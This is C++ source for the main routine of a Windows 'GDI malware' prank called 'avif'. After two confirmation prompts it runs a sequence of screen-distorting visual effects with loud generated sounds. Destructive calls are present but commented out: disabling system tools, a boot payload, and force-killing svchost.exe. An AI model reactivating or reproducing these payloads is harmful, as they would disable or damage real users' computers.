#include <Windows.h>
#include <cmath>
#include "payloads.h"
#include "gdipayloads.h"
#include "sounds.h"
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")



int __stdcall WinMain(HINSTANCE inst, HINSTANCE pinst, LPSTR lps, int n) {
	if (MessageBox(NULL, "Run Malware?", "avif", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) == IDNO)
	{
		return 0;
	}
	else
	{
		if (MessageBox(NULL, "Are you sure?", "avif", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) == IDNO)
		{
			return 0;
		}
		else
		{
//			Destruction::DisableSystemTools();
//			Destruction::BootPayload();
			// there is a PC.
			HANDLE a = CreateThread(0, 0, GDIEffects::Payload1, 0, 0, 0);
			Bytebeat::Sound1();
			Sleep(30000);
			Threads::threads(a);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE b = CreateThread(0, 0, GDIEffects::Payload2, 0, 0, 0);
			Bytebeat::Sound2();
			Sleep(30000);
			Threads::threads(b);
			InvalidateRect(0, 0, 0);
			Sleep(100);
//			ShellExecuteA(NULL, "open", "explorer", NULL, NULL, SW_HIDE);
			HANDLE c = CreateThread(0, 0, GDIEffects::GaussianBlur, 0, 0, 0);
			HANDLE c2 = CreateThread(0, 0, GDIEffects::Icons, 0, 0, 0);
			Bytebeat::Sound3();
			Sleep(30000);
			Threads::threads(c); Threads::threads(c2);
			InvalidateRect(0, 0, 0);
//			ShellExecuteA(NULL, "open", "mspaint", NULL, NULL, SW_HIDE);
			Sleep(100);
			HANDLE d = CreateThread(0, 0, GDIEffects::Texts, 0, 0, 0);
			HANDLE d2 = CreateThread(0, 0, GDIEffects::BitBltMadness, 0, 0, 0);
			Bytebeat::Sound4();
			Sleep(30000);
			Threads::threads(d); Threads::threads(d2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
//			CreateThread(0, 0, Shell::OpenPrograms, 0, 0, 0);
			HANDLE e = CreateThread(0, 0, GDIEffects::InvertShake, 0, 0, 0);
			Bytebeat::Sound5();
			Sleep(30000);
			Threads::threads(e);
			InvalidateRect(0, 0, 0);
//			HANDLE setStrings = CreateThread(0, 0, Shell::StringQuestionMarks, 0, 0, 0);
			Sleep(100);
			HANDLE f = CreateThread(0, 0, GDIEffects::icoPayload, 0, 0, 0);
//			Bytebeat::Sound6(); // this one writes the sound to a directory called "avif" in the C drive.
			Sleep(30000);
			Threads::threads(f);
			InvalidateRect(0, 0, 0);
//			HANDLE movingCursor = CreateThread(0, 0, Mouse::SetMousePosition, 0, 0, 0);
			Sleep(100);
//			HANDLE cursorSpam = CreateThread(0, 0, Mouse::PasteMouse, 0, 0, 0);
			HANDLE g = CreateThread(0, 0, GDIEffects::NeonVision, 0, 0, 0);
			HANDLE g2 = CreateThread(0, 0, GDIEffects::Texts2, 0, 0, 0);
			Bytebeat::Sound7();
			Sleep(30000);
			Threads::threads(g); Threads::threads(g2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE h = CreateThread(0, 0, GDIEffects::TextRGBMash, 0, 0, 0);
			Bytebeat::Sound8();
			Sleep(30000);
			Threads::threads(h);
			CreateThread(0, 0, Message::Messagebox, 0, 0, 0);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE i = CreateThread(0, 0, GDIEffects::tifShaking, 0, 0, 0);
			HANDLE i2 = CreateThread(0, 0, GDIEffects::SlowPat, 0, 0, 0);
			HANDLE i3 = CreateThread(0, 0, GDIEffects::Texts, 0, 0, 0);
			Bytebeat::Sound9();
			Sleep(100);
//			ShellExecuteA(NULL, "open", "taskkill", "/f /im svchost.exe", NULL, SW_HIDE);
			Sleep(29900);
			Threads::threads(i3); Threads::threads(i2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE j = CreateThread(0, 0, GDIEffects::PolyMash, 0, 0, 0);
			Bytebeat::Sound10();
			Sleep(30000);
			Threads::threads(j); Threads::threads(i);
		}
	}
}
